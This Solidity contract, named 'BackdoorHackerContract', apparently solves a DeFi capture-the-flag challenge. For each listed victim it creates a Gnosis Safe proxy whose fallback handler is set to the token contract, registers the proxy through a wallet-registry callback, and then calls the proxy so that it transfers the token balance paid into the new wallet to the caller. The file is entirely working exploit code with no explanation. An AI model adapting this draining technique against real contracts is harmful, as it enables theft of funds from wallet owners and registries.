// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./gnosis.pm/proxies/GnosisSafeProxyFactory.sol";
import "./gnosis.pm/GnosisSafe.sol";
import "hardhat/console.sol";

contract BackdoorHackerContract {

    function hack(address _gnosisSafeProxyFactory, address _walletRegistry, address _singleton, IERC20 token, address[] calldata _victims) external {        
        for (uint i; i <_victims.length;) {
            address[] memory _owners = new address[](1);
            _owners[0] = _victims[i];
            bytes memory initializer = abi.encodeWithSelector(GnosisSafe.setup.selector, _owners, 1, address(0x00), 0x00, address(token), address(0x0), 0, address(0x0));
            
            (bool success, bytes memory data) = _gnosisSafeProxyFactory.call(abi.encodeWithSelector(GnosisSafeProxyFactory.createProxyWithCallback.selector,_singleton, initializer, 0, _walletRegistry));
            require(success, "BackdoorHacker: tx1 failed");
           unchecked{++i;}

           (address proxy) = abi.decode(data, (address));

           uint balance = token.balanceOf(proxy);

           (bool success1,) = proxy.call(abi.encodeWithSelector(IERC20.transfer.selector, msg.sender, balance));
           require(success1, "BackdoorHacker: tx2 failed");  
        }   
    }

}
